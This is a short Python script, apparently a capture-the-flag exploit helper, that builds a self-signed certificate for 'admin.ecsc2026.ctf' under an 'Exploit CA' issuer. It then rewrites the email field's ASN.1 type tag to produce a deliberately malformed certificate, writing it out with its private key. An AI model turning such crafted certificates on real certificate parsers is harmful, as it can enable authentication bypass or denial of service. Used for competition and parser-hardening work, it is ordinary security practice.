#!/usr/bin/env python3

import base64
import datetime

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import NameOID


HOSTNAME = "admin.ecsc2026.ctf"
EMAIL = "foo@bar.invalid"


def pem_certificate(der: bytes) -> bytes:
    encoded = base64.b64encode(der)
    lines = [b"-----BEGIN CERTIFICATE-----"]
    for offset in range(0, len(encoded), 64):
        lines.append(encoded[offset : offset + 64])
    lines.append(b"-----END CERTIFICATE-----")
    return b"\n".join(lines) + b"\n"


def main() -> None:
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    subject = x509.Name(
        [
            x509.NameAttribute(NameOID.COMMON_NAME, HOSTNAME),
            x509.NameAttribute(NameOID.EMAIL_ADDRESS, EMAIL),
        ]
    )
    issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "Exploit CA")])

    now = datetime.datetime.now(datetime.timezone.utc)

    certificate = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(days=1))
        .not_valid_after(now + datetime.timedelta(days=3650))
        .sign(key, hashes.SHA256())
    )

    email = EMAIL.encode()
    valid_email = bytes([0x16, len(email)]) + email
    malformed_email = bytes([0x12, len(email)]) + email

    data = certificate.public_bytes(serialization.Encoding.DER)
    data = data.replace(valid_email, malformed_email)

    cert_bytes = pem_certificate(data)
    key_bytes = key.private_bytes(
        encoding = serialization.Encoding.PEM,
        format = serialization.PrivateFormat.PKCS8,
        encryption_algorithm = serialization.NoEncryption()
    )

    with open("cert.pem", "wb") as f:
        f.write(cert_bytes)

    with open("key.pem", "wb") as f:
        f.write(key_bytes)


if __name__ == "__main__":
    main()
